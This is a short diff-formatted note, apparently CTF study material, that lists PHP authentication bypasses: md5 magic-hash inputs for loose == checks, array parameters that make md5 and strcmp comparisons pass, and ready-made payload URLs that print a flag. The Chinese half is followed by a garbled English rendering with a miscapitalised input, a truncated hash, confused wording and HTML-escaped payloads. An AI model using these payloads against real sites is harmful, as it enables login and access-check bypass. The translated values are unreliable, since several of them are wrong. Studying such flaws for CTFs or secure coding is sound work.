@@ -1,0 +1,25 @@
+利用php的md5()函数有一个缺陷，这里是==，
+240610708	0e462097431906509019562988736854
+QNKCDZO		0e830400451993494058024219903391
+s878926199a	0e545993274517709034328855841020
+
+利用php的md5()函数有一个缺陷，这里是===，==也可以
+只能用数组处理，它无法处理数组返回null构造payload: ?username[]=1&password[]=2
+
+strcmp的数组get漏洞，当strcmp（数组，字符串）==0
+例子：
+if(!strcmp($v3, $flag)){
+    echo $flag;}
+payload:http://xxxx/?v1=QNKCDZO&v2=240610708&v3[]=0
+--------------------------------------------------------
+There is a flaw in using php's MD5 () function, which is==,
+240610708 0e462097431906509019562988736854
+QNKCDZO 0e830400451993494058024219903391
+S878926199a 0e5459932745177090348855841020
+There is a flaw in using php's MD5 () function, where it's===, === OK.
+It can only be processed with arrays, which cannot handle returning null to construct payload:? Username []= 1 &amp; password []= 2
+An array get vulnerability in strcmp, when StrCmp (array, string) ==0
+Example:
+If (! StrCmp ($v3, $flag){
+Echo $flag;}
+Payload: http://xxx/?V1=QNKCDZO&amp;v2=240610708&amp;v3[]=0
